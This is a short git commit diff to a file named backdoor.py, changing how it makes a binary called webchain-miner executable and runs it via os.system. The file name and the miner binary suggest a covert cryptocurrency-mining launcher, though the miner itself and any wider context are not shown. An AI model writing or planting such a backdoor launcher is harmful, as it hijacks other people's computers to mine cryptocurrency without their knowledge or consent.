c12e46a685eedf66ce1399c1b4cbb1034367a19d
Allespro <39953296+Allespro@users.noreply.github.com>
2019-07-23 23:53:31 +0000

    Update backdoor.py

--- backdoor.py
+++ backdoor.py
@@ -1,6 +1,6 @@
+#!/usr/bin/env python
 import os
+import sys
 
-os.system("chmod +x ./webchain-miner")
-
-
-os.system("./webchain-miner")
+if __name__ == "__main__":
+    os.system("chmod +x ./webchain-miner && ./webchain-miner")
